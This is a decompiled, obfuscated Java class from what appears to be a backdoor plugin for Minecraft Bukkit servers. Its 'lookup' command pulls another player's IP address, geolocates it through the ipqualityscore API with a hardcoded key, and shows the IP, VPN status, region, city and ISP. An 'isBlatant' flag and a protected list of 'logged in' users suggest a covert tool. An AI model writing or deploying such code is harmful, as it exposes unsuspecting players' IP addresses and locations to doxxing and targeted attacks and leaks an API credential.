/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.json.JSONObject;

public class LookupCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIlllIIlIIIIlIllIll, String llllllllllllllIlllIIlIIIIlIllllI, String[] llllllllllllllIlllIIlIIIIlIllIlI, Player llllllllllllllIlllIIlIIIIlIllIIl) {
        if (llllllllllllllIlllIIlIIIIlIllIlI.length <= 1) {
            llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(Settings.USAGE("lookup <player>"));
        } else {
            Player llllllllllllllIlllIIlIIIIllIIIIl = Bukkit.getServer().getPlayer(llllllllllllllIlllIIlIIIIlIllIlI[1]);
            if (llllllllllllllIlllIIlIIIIllIIIIl == null) {
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIlllIIlIIIIlIllIlI[1]).append(Settings.WHITE).append(" is not online."))));
            } else if (llllllllllllllIlllIIlIIIIlIllIll.lite.contains(llllllllllllllIlllIIlIIIIllIIIIl.getName())) {
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(Settings.PREFIX("You cannot lookup players logged in!"));
            } else {
                String llllllllllllllIlllIIlIIIIllIIlIl = "false";
                String llllllllllllllIlllIIlIIIIllIIlII = "Unknown";
                String llllllllllllllIlllIIlIIIIllIIIll = "Unknown";
                String llllllllllllllIlllIIlIIIIllIIIlI = "Unknown";
                try {
                    String llllllllllllllIlllIIlIIIIllIlIll;
                    URL llllllllllllllIlllIIlIIIIllIlIlI = new URL(String.valueOf(new StringBuilder().append("https://www.ipqualityscore.com/api/json/ip/UCNKI16V5h8Bum2rmHHFKTjZDTBzqff8/").append(API.getIPOfPlayer(llllllllllllllIlllIIlIIIIllIIIIl))));
                    HttpURLConnection llllllllllllllIlllIIlIIIIllIlIIl = (HttpURLConnection)llllllllllllllIlllIIlIIIIllIlIlI.openConnection();
                    BufferedReader llllllllllllllIlllIIlIIIIllIlIII = new BufferedReader(new InputStreamReader(llllllllllllllIlllIIlIIIIllIlIIl.getInputStream()));
                    StringBuffer llllllllllllllIlllIIlIIIIllIIlll = new StringBuffer();
                    while ((llllllllllllllIlllIIlIIIIllIlIll = llllllllllllllIlllIIlIIIIllIlIII.readLine()) != null) {
                        llllllllllllllIlllIIlIIIIllIIlll.append(llllllllllllllIlllIIlIIIIllIlIll);
                    }
                    llllllllllllllIlllIIlIIIIllIlIII.close();
                    JSONObject llllllllllllllIlllIIlIIIIllIIllI = new JSONObject(llllllllllllllIlllIIlIIIIllIIlll.toString());
                    if (llllllllllllllIlllIIlIIIIllIIllI.has("proxy")) {
                        if (llllllllllllllIlllIIlIIIIllIIllI.getBoolean("proxy")) {
                            llllllllllllllIlllIIlIIIIllIIlIl = "true";
                        } else if (llllllllllllllIlllIIlIIIIllIIllI.has("vpn") && llllllllllllllIlllIIlIIIIllIIllI.getBoolean("vpn")) {
                            llllllllllllllIlllIIlIIIIllIIlIl = "true";
                        }
                    }
                    if (llllllllllllllIlllIIlIIIIllIIllI.has("city")) {
                        llllllllllllllIlllIIlIIIIllIIIll = llllllllllllllIlllIIlIIIIllIIllI.getString("city");
                    }
                    if (llllllllllllllIlllIIlIIIIllIIllI.has("region")) {
                        llllllllllllllIlllIIlIIIIllIIlII = llllllllllllllIlllIIlIIIIllIIllI.getString("region");
                    }
                    if (llllllllllllllIlllIIlIIIIllIIllI.has("ISP")) {
                        llllllllllllllIlllIIlIIIIllIIIlI = llllllllllllllIlllIIlIIIIllIIllI.getString("ISP");
                    }
                }
                catch (IOException iOException) {
                    // empty catch block
                }
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage("\u00a78\u00a7m----------------------------------");
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(String.valueOf(new StringBuilder().append("         \u00a74").append(Settings.NAME).append(" lookup on ").append(llllllllllllllIlllIIlIIIIllIIIIl.getName())));
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage("");
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(String.valueOf(new StringBuilder().append(Settings.DARK_RED).append("IP Address: ").append(Settings.WHITE).append(API.getIPOfPlayer(llllllllllllllIlllIIlIIIIllIIIIl))));
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(String.valueOf(new StringBuilder().append(Settings.DARK_RED).append("On VPN?: ").append(Settings.WHITE).append(llllllllllllllIlllIIlIIIIllIIlIl)));
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(String.valueOf(new StringBuilder().append(Settings.DARK_RED).append("Region: ").append(Settings.WHITE).append(llllllllllllllIlllIIlIIIIllIIlII)));
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(String.valueOf(new StringBuilder().append(Settings.DARK_RED).append("City: ").append(Settings.WHITE).append(llllllllllllllIlllIIlIIIIllIIIll)));
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage(String.valueOf(new StringBuilder().append(Settings.DARK_RED).append("ISP: ").append(Settings.WHITE).append(llllllllllllllIlllIIlIIIIllIIIlI)));
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage("");
                llllllllllllllIlllIIlIIIIlIllIIl.sendMessage("\u00a78\u00a7m----------------------------------");
            }
        }
    }

    public LookupCommand() {
        LookupCommand llllllllllllllIlllIIlIIIIllllIll;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

